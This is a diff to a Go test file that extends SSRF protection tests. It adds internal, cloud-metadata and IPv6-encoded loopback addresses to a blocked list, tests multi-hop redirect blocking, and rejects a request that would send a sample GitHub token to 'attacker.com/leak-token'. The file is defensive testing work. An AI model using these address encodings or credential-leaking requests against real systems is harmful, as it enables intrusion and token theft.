@@ -41,15 +41,21 @@ func TestPlatformRegistry(t *testing.T) {
 func TestSSRFProtection(t *testing.T) {
 	blockedURLs := []string{
 		"http://localhost:8080/admin",
+		"http://localhost.:8080/admin",
 		"http://127.0.0.1:9090",
 		"http://127.0.0.2:3000",
 		"http://0.0.0.0:80",
 		"http://169.254.169.254/latest/meta-data/",
+		"http://168.63.129.16/metadata",
 		"http://10.0.0.5/api",
 		"http://192.168.1.1/secret",
 		"http://172.16.0.10:8000",
 		"http://[::1]:8080",
+		"http://[::127.0.0.1]:8080",
+		"http://[::169.254.169.254]:8080",
 		"http://[::ffff:127.0.0.1]:8080",
+		"http://[2002:7f00:1::]:8080",
+		"http://[64:ff9b::127.0.0.1]:8080",
 		"http://[fd12:3456:789a:1::1]:8080",
 		"http://[fe80::1]:8080",
 		"http://100.100.100.200:80",
@@ -140,5 +146,44 @@ func TestSafeHTTPClientRedirectBlock(t *testing.T) {
 	_, err := client.Do(req)
 	if err == nil {
 		t.Fatal("expected error following redirect to 127.0.0.1, got nil")
+	}
+}
+
+func TestBaseAdapterForeignHostRejection(t *testing.T) {
+	adapter := platform.NewBaseAdapter(platform.ProviderMetadata{
+		ID:       "github",
+		Name:     "GitHub",
+		BaseURL:  "https://api.github.com",
+		Category: platform.CategoryDeveloper,
+	}, 5*time.Second)
+
+	execReq := &platform.ExecutionRequest{
+		Path:             "https://attacker.com/leak-token",
+		Method:           http.MethodGet,
+		CredentialSecret: "ghp_supersecretvalue",
+	}
+
+	_, err := adapter.Execute(context.Background(), execReq)
+	if err == nil {
+		t.Fatal("expected error when target host does not match provider BaseURL host, got nil")
+	}
+}
+
+func TestSafeHTTPClientMultiHopRedirectBlock(t *testing.T) {
+	hop2 := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		http.Redirect(w, r, "http://[::127.0.0.1]:8080/internal", http.StatusFound)
+	}))
+	defer hop2.Close()
+
+	hop1 := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		http.Redirect(w, r, hop2.URL, http.StatusFound)
+	}))
+	defer hop1.Close()
+
+	client := platform.NewSafeHTTPClient(5*time.Second, false)
+	req, _ := http.NewRequest(http.MethodGet, hop1.URL, nil)
+	_, err := client.Do(req)
+	if err == nil {
+		t.Fatal("expected error following multi-hop redirect to ::127.0.0.1, got nil")
 	}
 }
